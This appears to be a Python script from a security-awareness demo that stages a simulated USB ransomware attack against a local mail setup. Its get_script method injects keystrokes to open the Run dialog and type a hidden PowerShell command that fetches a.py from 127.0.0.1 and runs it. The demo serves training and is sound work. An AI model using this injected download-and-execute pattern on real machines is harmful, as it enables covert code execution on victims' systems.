#!/usr/bin/env python3

# SPDX-License-Identifier: AGPL-3.0-only

import logging
import time
import importlib.resources
import pathlib
from pynput.keyboard import Controller, Key

from typing import List

from nativeapp.utils.mail import mail_client, mail_program
from nativeapp.utils.admin import admin_app
from nativeapp.utils.usb import usb_monitor
from nativeapp.config import config

from nativeapp.utils.locale import locale

from demos.uhh_usb_ransomware.native import simulate_ransomware


class RansomwareDemo:

    def __init__(self):
        self.email_client = mail_client.MailClient(
                "127.0.0.1",
                993,
                465,
                "max.mustermann@nimbus.de",
                "123")
        with importlib.resources.path(
                "demos.uhh_usb_ransomware.resources.mail",
                "mpse_profile.zip") as mail_profile:
            self.email_program = mail_program.MailProgramThunderbird(
                    "MPSE", str(mail_profile))

        self.running = False
        self.admin_client = admin_app.NativeappAdminClient()
        self.usb_monitor = None

        localedir = pathlib.Path(__file__).parent.parent / "locales"
        self.locale = locale.Locale()
        self.locale.add_locale_dir(localedir)
        self.ransomware_simulation = \
            simulate_ransomware.RansomwareSimulation(self.locale)

    def start(self):
        if self.running:
            self.stop()
        self.locale.update_locale(config.EnvironmentConfig.LANGUAGE)

        # set hosts entry
        self.running = True
        self.email_program.copy_profile()
        self.usb_monitor = usb_monitor.USBMonitor(on_connect=self.get_script)

        self.admin_client.send_command(
                admin_app.NativeappCommands.DISABLE_USB, b"1")
        self.admin_client.send_command(
                admin_app.NativeappCommands.SET_REDIRECT,
                admin_app.create_host_payload(
                    True, "mail.nimbus.de", "127.0.0.1"))

        while not self.email_client.wait_for_smtp_server(20):
            pass

        while not self.email_client.wait_for_imap_server(20):
            pass

        self.email_program.start()
        self.ransomware_simulation.prepare()

    def stop(self):
        self.running = False
        logging.info("Stopping mail program")
        self.email_program.stop()
        logging.info("reverting admin settings")
        self.admin_client.send_command(
                admin_app.NativeappCommands.DISABLE_USB, b"0")
        self.admin_client.send_command(
                admin_app.NativeappCommands.SET_REDIRECT,
                admin_app.create_host_payload(
                    False, "mail.nimbus.de"))
        if self.usb_monitor:
            self.usb_monitor.stop()
        if self.ransomware_simulation:
            self.ransomware_simulation.stop()
        logging.info("Stop done")

    def ransomware(self):
        self.ransomware_simulation.run_ransomware()

    def get_script(self, usb_info) -> None:
        keyboard = Controller()
        keystroke_injection_sleeps = 0.5
        hostname = "127.0.0.1"
        filename = "a.py"
        keyboard.press(Key.cmd)
        keyboard.press("r")
        keyboard.release(Key.cmd)
        keyboard.release("r")
        time.sleep(keystroke_injection_sleeps)
        cmd = "powershell -Windowstyle hidden curl.exe -k http://{0}/{1} -s -o $ENV:Temp/{1} ; python $ENV:Temp/{1}".format(hostname, filename)  # noqa: E501
        keyboard.type(cmd)  # noqa: E501
        time.sleep(keystroke_injection_sleeps)
        keyboard.press(Key.enter)
        keyboard.release(Key.enter)

    def _send_mail(self, mail_files: List[str]) -> None:
        print(config.EnvironmentConfig.LANGUAGE)
        for mail_file in mail_files:
            with importlib.resources.path(
                    "demos.uhh_usb_ransomware.resources.mail",
                    mail_file) as mail_path:
                logging.info(f"Getting path for file {mail_file}: {mail_path}")
                self.email_client.send_mail_from_file(
                    mail_path, (0, 0), self.locale.translate)

    def send_mails(self) -> None:
        self._send_mail(["pictures.yml"])
